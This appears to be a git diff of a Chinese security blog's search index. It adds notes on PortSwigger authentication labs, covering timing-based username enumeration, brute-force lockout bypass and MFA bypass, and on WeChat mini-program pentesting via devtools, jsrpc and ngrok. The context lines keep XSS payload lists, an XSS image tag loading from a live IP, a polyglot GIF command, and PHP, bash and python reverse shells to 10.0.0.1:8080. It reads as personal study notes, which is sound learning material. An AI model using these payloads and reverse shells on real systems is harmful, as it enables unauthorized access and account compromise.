@@ -1,6 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>靶场练习-身份认证</title>
+    <url>//https://portswigger.net/web-security/authentication/password-based</url>
+    <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="1-响应时间异常"><a href="#1-响应时间异常" class="headerlink" title="1.响应时间异常"></a>1.响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
+<p>注：新版bp没有respose time了，可以用如下列，也可以用logger++插件</p>
+<table>
+<thead>
+<tr>
+<th align="center">含义</th>
+<th align="center">字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">收到响应头的时间（即服务端开始响应）</td>
+<td align="center">Response received</td>
+</tr>
+<tr>
+<td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
+<td align="center">Response completed</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h3 id="2-限制失败次数"><a href="#2-限制失败次数" class="headerlink" title="2.限制失败次数"></a>2.限制失败次数</h3><h5 id="利用因子：登录会刷新积累的失败次数"><a href="#利用因子：登录会刷新积累的失败次数" class="headerlink" title="利用因子：登录会刷新积累的失败次数"></a>利用因子：登录会刷新积累的失败次数</h5><p>正确账号密码绕过爆破限制，就是时不时登录已知的正确账号刷新失败次数</p>
+<p>注：X-Forwarded-For: 116.23.165.1 一般不用这个了，比较远古</p>
+<h3 id="3-限制账号登录"><a href="#3-限制账号登录" class="headerlink" title="3.限制账号登录"></a>3.限制账号登录</h3><h5 id="利用因子：用户体量极大"><a href="#利用因子：用户体量极大" class="headerlink" title="利用因子：用户体量极大"></a>利用因子：用户体量极大</h5><p>爆破随机账号，适用于用户体量大的</p>
+<p>即任意账号，限制密码个数</p>
+<h3 id="4-常规账号登录"><a href="#4-常规账号登录" class="headerlink" title="4.常规账号登录"></a>4.常规账号登录</h3><h5 id="利用因子：存在多个认证因素时，不报错"><a href="#利用因子：存在多个认证因素时，不报错" class="headerlink" title="利用因子：存在多个认证因素时，不报错"></a>利用因子：存在多个认证因素时，不报错</h5><p>例如：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;abc&quot;</span><span class="punctuation">,</span><span class="string">&quot;123456&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-多因素认证"><a href="#5-多因素认证" class="headerlink" title="5.多因素认证"></a>5.多因素认证</h3><h5 id="利用因子：第二因素易绕过"><a href="#利用因子：第二因素易绕过" class="headerlink" title="利用因子：第二因素易绕过"></a>利用因子：第二因素易绕过</h5><p>例如：图形验证码可用captcha-killer插件绕过</p>
+<p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于微信的渗透</title>
+    <url>/2025/06/13/%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="rpc连接"><a href="#rpc连接" class="headerlink" title="rpc连接"></a>rpc连接</h1><h2 id="1-wxdevtools-jsrpc"><a href="#1-wxdevtools-jsrpc" class="headerlink" title="1.wxdevtools+jsrpc"></a>1.wxdevtools+jsrpc</h2><p>强开devtools限定小程序为8555</p>
+<p>使其他文件“只读”，则微信只能使用8555</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\TestFolder&quot; /deny <span class="variable">%username%</span>:W</span><br></pre></td></tr></table></figure>
+
+<p>利用websock，直接跑参数，可忽略加密</p>
+<p>注：小程序默认只支持wss，可能还限制域名</p>
+<h2 id="2-工具-taro-wxtool-jsrpc"><a href="#2-工具-taro-wxtool-jsrpc" class="headerlink" title="2.工具&#x2F;taro-wxtool+jsrpc"></a>2.工具&#x2F;taro-wxtool+jsrpc</h2><p>注意：报错 _typeof3 is not a function</p>
+<span id="more"></span> 
+
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof2</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="string">&quot;@babel/helpers - typeof&quot;</span><span class="string">``</span>;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>(_typeof2 = <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span>.<span class="property">iterator</span> ? <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125;)(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>=== <span class="title function_">_typeof2</span>(<span class="title class_">Symbol</span>.<span class="property">iterator</span>) ? <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125;, <span class="title function_">_typeof</span>(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = _typeof;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="（2）-扩展-ngrok-jsrpc-映射"><a href="#（2）-扩展-ngrok-jsrpc-映射" class="headerlink" title="（2）.扩展  ngrok+jsrpc 映射"></a>（2）.扩展  ngrok+jsrpc 映射</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ngrok http 12080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> <span class="title class_">Hlclient</span>(<span class="string">&quot;wss://xxxxxxxxx.ngrok-free.app/ws?group=zzz&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="3-手机小程序调试"><a href="#3-手机小程序调试" class="headerlink" title="3.手机小程序调试"></a>3.手机小程序调试</h2><p><a href="http://debugx5.qq.com/">http://debugx5.qq.com/</a></p>
+<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="1-js-node-server"><a href="#1-js-node-server" class="headerlink" title="1.js+node-server"></a>1.js+node-server</h2>]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>spring-boot详解</title>
     <url>/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<blockquote>
@@ -414,14 +489,14 @@
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>; alert<span class="string">`1`</span>; <span class="comment">//&quot;;</span></span><br><span class="line"><span class="number">0</span>||alert%0D<span class="string">`1`</span><span class="comment">//</span></span><br><span class="line">%0a<span class="string">`<span class="subst">$&#123;alert%0D(<span class="number">1</span>)&#125;</span>`</span></span><br><span class="line">onload=alert<span class="string">`1`</span> <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">\u0022\u003b+alert\u00601\u0060\u003b+<span class="comment">//</span></span><br></pre></td></tr></table></figure>
 
 <hr>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">    #通杀标签</span><br><span class="line">    &lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#normal</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">#img</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">#svg</span><br><span class="line">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">    </span><br><span class="line">#标签</span><br><span class="line">&lt;aaaa id=&quot;c&quot; onfocus=&quot;alert(1)&quot; tabindex=0&gt;</span><br><span class="line">        </span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 
+<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://116.205.161.165/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
+<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
+<p><a href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
+<p>用ai改了一下，python3也可以用</p>
+<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
 <h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -1400,8 +1475,8 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Cybersecurity</tag>
         <tag>Honeypot</tag>
+        <tag>Cybersecurity</tag>
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
